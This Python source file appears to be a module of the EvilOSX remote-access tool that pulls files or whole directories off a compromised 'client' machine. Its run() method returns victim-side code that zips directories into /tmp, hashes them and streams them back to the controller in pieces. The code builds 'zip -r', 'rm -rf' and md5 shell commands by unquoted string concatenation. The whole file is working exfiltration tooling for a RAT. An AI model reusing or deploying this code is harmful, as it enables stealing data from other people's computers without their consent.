import os
import subprocess
import re


class Module:
    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Download a file or directory from the client.",
            "References": [],
            "Task": True
        }
        self.download_file = None
        self.output_folder = None
        self.buffer_size = None

    def setup(self, module_view, output_view, successful):
        self.download_file = module_view.prompt("Path to file or directory on client machine: ")
        self.output_folder = os.path.expanduser(module_view.prompt("Local output folder (ENTER for output/): "))
        self.buffer_size = module_view.prompt("Buffer size (ENTER for 4096 bytes): ")

        # Set default variables.
        if not self.buffer_size:
            self.buffer_size = 4096
        if type(self.buffer_size) is not int:
            output_view.add("Invalid buffer size, using 4096.", "info")
            self.buffer_size = 4096
        if not self.output_folder:
            self.output_folder = "output"

            if not os.path.exists("output"):
                os.mkdir("output")

        if os.path.exists(os.path.join(self.output_folder, os.path.basename(self.download_file))):
            output_view.add("A file with that name already exists!", "attention")
            successful.put(False)
        elif not os.path.exists(self.output_folder):
            output_view.add("Output folder doesn't exist!", "attention")
            successful.put(False)
        else:
            successful.put(True)

    def run(self):
        return """\
        import uuid
        
        download_file = os.path.expanduser("%s")

                
        def get_file_hash(file_path):
            \"\"\":return The MD5 hash of the specified file path.\"\"\"
            return run_command("md5 " + os.path.realpath(file_path)).split(" = ")[1]
            
        
        def upload_file(file_path):
            \"\"\"Send back the file in pieces to the server (so we support very large files).\"\"\"
            with open(file_path, "rb") as input_file:
                while True:
                    try:
                        piece = input_file.read(%s)
                        
                        if not piece:
                            break
                        send_response(piece, "download")
                    except SystemExit:
                        # Thrown when "kill download" is run.
                        send_response("Stopped uploading.", "download")
                        break
        
        
        if not os.path.exists(download_file):
            send_response("Failed to download, invalid path.", "download")
        else:
            if os.path.isdir(download_file):
                send_response("Compressing directory: " + download_file, "download")
                zip_file = os.path.join("/tmp", str(uuid.uuid4()).replace("-", "")[:12] + ".zip")
                
                run_command("zip -r " + zip_file + " " + download_file, False, False)
                
                send_response("Started:Directory:" + get_file_hash(zip_file), "download")
                upload_file(zip_file)
                
                send_response("Finished.", "download")
                run_command("rm -rf " + zip_file)
            else:
                send_response("Started:File:" + get_file_hash(download_file), "download")
                upload_file(download_file)
                
                send_response("Finished.", "download")
        """ % (self.download_file, self.buffer_size)

    def process_response(self, output_view, response):
        # Files are sent back to us in small pieces (encoded with Base64),
        # we simply decode these pieces and write them to the output file.
        output_name = os.path.basename(self.download_file)
        output_file = os.path.join(self.output_folder, output_name)

        if "Failed to download" in response:
            output_view.add(response, "attention")
        elif "Compressing directory" in response:
            output_view.add(response, "info")
        elif "Stopped" in response:
            output_view.add(response, "info")
        elif "Started" in response:
            file_type = response.split(":")[1].lower()
            md5_hash = response.split(":")[2]

            if file_type == "directory":
                # Updates the output name for the next request.
                self.download_file = self.download_file + ".zip"

            output_view.add("Started downloading: \"%s\"..." % output_name)
            output_view.add("Remote MD5 file hash: %s" % md5_hash)
        elif "Finished" in response:
            output_view.add("Local MD5 file hash (should match): %s" % self.get_file_hash(output_file))
            output_view.add("Finished file download, saved to: %s" % output_file)
        else:
            with open(output_file, "a") as output_file:
                output_file.write(response)

    def get_file_hash(self, file_path):
        md5_programs = ["md5sum", "md5"]  # Tested on Linux and Mac (lol @ Windows)

        for program in md5_programs:
            try:
                hash_command = program + " " + os.path.realpath(file_path)
                process = subprocess.Popen(hash_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

                return re.findall(r"([a-fA-F\d]{32})", (process.stdout.readline() + process.stderr.readline()))[0]
            except IndexError:
                continue
